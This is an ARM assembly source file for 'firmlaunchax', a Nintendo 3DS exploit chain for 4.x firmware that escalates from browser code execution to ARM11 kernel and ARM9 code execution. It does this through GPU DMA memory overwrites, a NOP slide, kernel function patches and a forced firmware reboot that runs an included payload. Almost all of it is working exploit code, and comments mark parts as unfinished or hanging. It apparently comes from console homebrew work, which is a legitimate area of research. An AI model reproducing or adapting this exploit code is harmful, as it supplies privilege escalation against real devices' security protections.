;;-----------------------------------------------;;
;;   firmlaunchax - arm9 kernel code execution   ;;
;;               on Spider exploit.              ;;
;;             FOR 4.X CONSOLES ONLY             ;;
;;   - Based on Roxas75 MSET Firmlaunchax        ;;
;;   - adapted using YIFAN LU GW code reversing  ;;
;;-----------------------------------------------;;

.nds
.create "build/arm11hax.bin", 0x009D2000
.arm

_start:
b main

;-------------------------- GLOBALS ------------------------------
.definelabel top_fb1,                                   0x14184E60
.definelabel top_fb2,                                   0x141CB370
.definelabel gsp_addr,                                  0x18400000
.definelabel gsp_handle,                                0x003B643C 
.definelabel gsp_code_addr,                             0x00100000
.definelabel fcram_code_addr,                           0x03E6D000 ; correct???

.definelabel nn__gxlow__CTR__detail__GetInterruptReceiver,	0x003F54E8 ;
.definelabel gpuhandle,                                 0x003F5540 ; (nn__gxlow__CTR__detail__GetInterruptReceiver + 0x58)
.definelabel payload_addr,                              0x00140000

;------------------------- FUNCTIONS -----------------------------
.definelabel memcpy,                                      0x0029bf60; 		9.x Spider 0x00240b50 ; 4.x MSET 0x001BFA60
.definelabel GSPGPU_FlushDataCache,                       0x00344b84; 		9.x Spider 0x00191500 ; 4.x MSET 0x001346C4
;.definelabel GX_SetTextureCopy,                          Not available; 	9.x Spider 0x0011DD48 ; 4.x MSET 0x0013C284 
.definelabel nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue,   0x002CF3EC; 		9.x Spider 0x0012BF04 ; 4.x MSET 0x001AC924 
.definelabel svcControlMemory,                            0x002d6adc; 		9.x Spider 0x001431A0 ; 4.x MSET 0x001C3E24

;-------------------------- COSTANTS -----------------------------
costants:
jump_table_addr:        .word 0xEFFF4C80
jumptable_physical:     .word 0x1FFF4C80

jump_table_specific_addresses:
;Explanation: the code after the jumptable which does firmlaunchax
;itself, does not like variables. So we actually assume to not
;change it anymore and replace here the firm-specific addresses.
;These are just the variables offsets in arm9hax.bin

jt_pdn_regs:               .word 0x8
jt_pxi_regs:               .word 0xC
jt_func_patch_return_loc:  .word 0x10

;----------------------- FW SPECIFIC VARS ------------------------
FIRM_version:      		.word 0x02220000
Model:					.word 0x00000000
kernel_patch_addr:      .word 0xEFF83C97 ; -8 respect to Brahma. The same of Bootstrap
func_patch:             .word 0xEFFE4DD4
reboot_func:            .word 0xEFFF497C
func_patch_return_loc:  .word 0xFFF84DDC
fcram_address:          .word 0xF0000000
Exc_Handler_low:		.word 0xDFFF4000
Exc_Handler_up:			.word 0xFFFF0000
funct_to_call:          .word 0xFFF748C4
pdn_regs:               .word 0xFFFD0000
pxi_regs:               .word 0xFFFD2000

;----------------------------- CODE ------------------------------
.align 4
    main:
;        nop
;        nop

    get_memchunk:
        mov r0, #1
        str r0, [sp]
        mov r0, #0
        str r0, [sp,#4]
        ldr r0, =0xFFFFFE0
        ldr r1, =0x18451000
        mov r2, #0
        mov r3, #0x1000
        ldr lr, =svcControlMemory
        blx lr

    patch_memchunck:
        ldr r1, =0x18402000
        mov r0, #1
        str r0, [r1]

        ldr r2, =kernel_patch_addr
        ldr r2, [r2]
        str r2, [r1,#4]
        mov r0, #0
        str r0, [r1,#8]
        str r0, [r1,#12]
        ldr r0, =0x18451000
        mov r1, #0x10
        mov r3, #4
        bl do_gspwn_copy

   restore_memchunk:
        mov r0, #1
        str r0, [sp]
        mov r0, #0
        str r0, [sp,#4]
        ldr r0, =0xFFFFFE0
        ldr r1, =0x18450000
        mov r2, #0
        mov r3, #0x1000
        ldr lr, =svcControlMemory
        blx lr

    generate_nop_slide:
        mov r10, #0x4000
        ldr r0, =0x18402000
        ldr r1, =0xE1A00000
        nop_gen_loop:
            str r1, [r0]
            add r0, #4
            subs r10, #1
            bne nop_gen_loop
        ldr r1, =0xE12FFF1E     ; bx lr
        str r1, [r0,#-4]

    copy_nop_slide:
        ldr r0, =gsp_addr+fcram_code_addr+0x4000
        mov r1, #0x10000
        ldr r2, =0xE1A00000
        mov r3, #0
        bl do_gspwn_copy

    execute_nop_slide:
        ldr lr, =0x104000
        blx lr

    arm11_kernel_jump:
        ldr     R0, =arm11_kernel_entry
        .word 0xEF000008        ; SVC     8

        b arm11_kernel_jump
.pool

.align 4
do_gspwn_copy:
        stmfd sp!, {r4,r5,r9-r11,lr}
        mov r4, r0
        mov r10, r1
        mov r11, r2
        mov r9, r3
        sub sp, #0x20

    gspwn_loop:
        ldr r0, =0x18401000
        ldr r1, =0x18401000
        mov r2, #0x10000
        ldr lr, =memcpy
        blx lr
        ldr r0, =0x18402000
        mov r1, r10
        ldr lr, =GSPGPU_FlushDataCache
        blx lr

         ldr r0, =0x18400000
        mov r1, #4
        str r1, [r0]
        ldr r1, =0x18402000
        str r1, [r0,#4]
        mov r1, r4
        str r1, [r0,#8]
        mov r1, r10
        str r1, [r0,#12]
        mov r1, #0xFFFFFFFF
        str r1, [r0,#16]
        str r1, [r0,#20]
        mov r1, #8
        str r1, [r0,#24]
        mov r1, #0
        str r1, [r0,#28]
        mov r1, r0
        ldr r0, =gpuhandle
        ldr lr, =nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue
        blx lr  ; hangs here. I have to check both addresses for nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue and nn__gxlow__CTR__detail__GetInterruptReceiver

; DEBUG:
crashme:  .word 0xffffffff  ; Crash point to check that a code reach this point before freezing
;break:
;b break ; infinite loop - breakpoint to check where the code crashes

        ldr r0, =0x18401000
        mov r1, #0x10
        ldr lr, =GSPGPU_FlushDataCache
        blx lr

        ldr r0, =0x18400000
        mov r1, #4
        str r1, [r0]
        ldr r1, =0x18401000
        str r1, [r0,#8]
        mov r1, r4
        str r1, [r0,#4]
        mov r1, 16
        str r1, [r0,#12]
        mov r1, #0xFFFFFFFF
        str r1, [r0,#16]
        str r1, [r0,#20]
        mov r1, #8
        str r1, [r0,#24]
        mov r1, #0
        str r1, [r0,#28]
        mov r1, r0
        ldr r0, =gpuhandle
        ldr lr, =nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue
        blx lr

        ldr r0, =0x18401000
        ldr r1, =0x18401000
        mov r2, #0x10000
        ldr lr, =memcpy
        blx lr
        ldr r0, =0x18401000
        ldr r0, [r0,r9]
        cmp r0, r11
        bne gspwn_loop
        add sp, #0x20
        ldmfd sp!, {r4,r5,r9-r11,lr}
        bx lr
.pool

;---------------------- ARM11 KERNEL CODE ----------------------
.align 4
arm11_kernel_entry:

    arm11_start:

        .word 0xF57FF01F    ; clrex
        bl invalidate_dcache
        bl invalidate_icache

    copy_arm9:	;loads the default payload 
        ldr r0, =arm9_code
        ldr r1, =arm9_code_end-arm9_code
        add r1, r0
        ldr r2, =fcram_address
        ldr r2, [r2]
        ldr r3, =0x3F00000
        add r2, r3
        memcpy_arm9_code:
            ldmia r0!, {r3}
            stmia r2!, {r3}
            cmp r0, r1
            bcc memcpy_arm9_code

   copy_jumptable:
        ldr r0, =jump_table
        ldr r1, =jump_table_end-jump_table
        add r1, r0
        ldr r2, =jump_table_addr
        ldr r2, [r2]
        memcpy_arm11_hook:
            ldmia r0!, {r3}
            stmia r2!, {r3}
            cmp r0, r1
            bcc memcpy_arm11_hook

    change_jumptable_vars:
        ldr r0, =jump_table_addr
        ldr r0, [r0]
        ldr r1, =jt_func_patch_return_loc
        ldr r1, [r1]
        add r1, r0
        ldr r2, =func_patch_return_loc
        ldr r2, [r2]
        str r2, [r1]
        ldr r1, =jt_pdn_regs
        ldr r1, [r1]
        add r1, r0
        ldr r2, =pdn_regs
        ldr r2, [r2]
        str r2, [r1]
        ldr r1, =jt_pxi_regs
        ldr r1, [r1]
        add r1, r0
        ldr r2, =pxi_regs
        ldr r2, [r2]
        str r2, [r1]

    patch_arm11_functions:
        ldr r0, =func_patch
        ldr r0, [r0]
        ldr r1, =0xE51FF004
        str r1, [r0]
        ldr r1, =0xFFFF0C80
        str r1, [r0,#4]
        ldr r0, =reboot_func
        ldr r0, [r0]
        ldr r1, =0xE51FF004
        str r1, [r0]
        ldr r1, =0x1FFF4C80+4
        str r1, [r0,#4]
        bl invalidate_dcache

    trigger_reboot:
        mov r0, #0
        mov r1, #0
        mov r2, #2
        mov r3, #0
        ldr lr, =funct_to_call
        ldr lr, [lr]
        bx lr
.pool

invalidate_dcache:
    mov r0, #0
    mcr p15, 0, r0,c7,c14, 0
    mcr p15, 0, r0,c7,c10, 4
    bx lr

invalidate_icache:
    mov r0, #0
    mcr p15, 0, r0,c7,c5, 0
    mcr p15, 0, r0,c7,c5, 4
    mcr p15, 0, r0,c7,c5, 6
    mcr p15, 0, r0,c7,c10, 4
    bx lr

;----------------- ARM11 JUMPTABLE --------------------------
.align 4
    jump_table:
    .incbin "build/arm9hax.bin"
    jump_table_end:

;------------------------------- ARM9 CODE ------------------------------
.align 4
 arm9_code:
    .incbin "build/arm9_code.bin"
 arm9_code_end:

.pool
.close
